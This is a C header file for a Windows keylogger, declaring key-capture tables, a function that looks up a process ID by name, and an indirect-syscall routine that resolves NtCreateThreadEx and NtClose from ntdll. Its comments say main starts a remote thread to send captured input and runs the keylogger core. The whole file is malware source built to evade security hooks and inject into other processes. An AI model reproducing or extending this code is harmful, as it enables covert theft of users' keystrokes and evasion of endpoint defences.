#ifndef MAIN_H
#define MAIN_H

#include <windows.h>
#include "hash-tables/Keys.h"
#include "hash-tables/KeysCombinations.h"

typedef unsigned __int64 QWORD;
DWORD g_NtCreateThreadExSSN;
QWORD g_NtCreateThreadExSyscall;
DWORD g_NtCloseSSN;
QWORD g_NtCloseSyscall;

typedef NTSTATUS (NTAPI *PUSER_THREAD_START_ROUTINE)(
    _In_ PVOID ThreadParameter
);

typedef struct _PS_ATTRIBUTE {
    ULONG_PTR Attribute;
    SIZE_T Size;
    union
    {
        ULONG_PTR Value;
        PVOID ValuePtr;
    };
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE, *PPS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST {
    SIZE_T TotalLength;
    PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;

extern NTSTATUS NtCreateThreadEx(
    _Out_ PHANDLE ThreadHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ HANDLE ProcessHandle,
    _In_ PUSER_THREAD_START_ROUTINE StartRoutine,
    _In_opt_ PVOID Argument,
    _In_ ULONG CreateFlags, 
    _In_ SIZE_T ZeroBits,
    _In_ SIZE_T StackSize,
    _In_ SIZE_T MaximumStackSize,
    _In_opt_ PPS_ATTRIBUTE_LIST AttributeList
);

extern NTSTATUS NtClose(
    IN HANDLE Handle
);

char* userId;
char* result;

/**
 * @brief Main function invoking preparation routines, starts remote thread to send user input buffer,
 *        and launches the keylogger core functionality.
 *
 * @return int Exit code of the program.
 */
int main();

/**
 * @brief Inserts key combinations into the initialized table for further use.
 *
 * @param table Pointer to a `KeysCombinations` structure that stores key combinations.
 *              Must not be NULL.
 */
void initKeysCombinations(KeysCombinations *table);

/**
 * @brief Inserts individual keys into the initialized table for further use.
 *
 * @param table Pointer to a `Keys` structure that stores keys.
 *              Must not be NULL.
 */
void initKeys(Keys *table);

/**
 * @brief Queries the process ID (PID) by process name.
 *
 * @param processName Pointer to a null-terminated string specifying the process name.
 *                    Must not be NULL.
 * @return DWORD Process ID if the process exists, otherwise returns 0.
 */
DWORD getProcessPID(const char* processName);

/**
 * @brief Retrieves the syscall number and syscall instruction address for a given NT function.
 *
 * @param NtdllHandle Handle to the loaded ntdll.dll module.
 * @param NtFunctionName Pointer to a null-terminated string with the NT function name.
 * @param NtFunctionSSN Pointer to a DWORD that will receive the system call number (SSN).
 * @param NtFunctionSyscall Pointer to a UINT_PTR that will receive the address of the syscall instruction.
 */
VOID IndirectPrelude(HMODULE NtdllHandle, LPCSTR NtFunctionName, PDWORD NtFunctionSSN, PUINT_PTR NtFunctionSyscall);

#endif
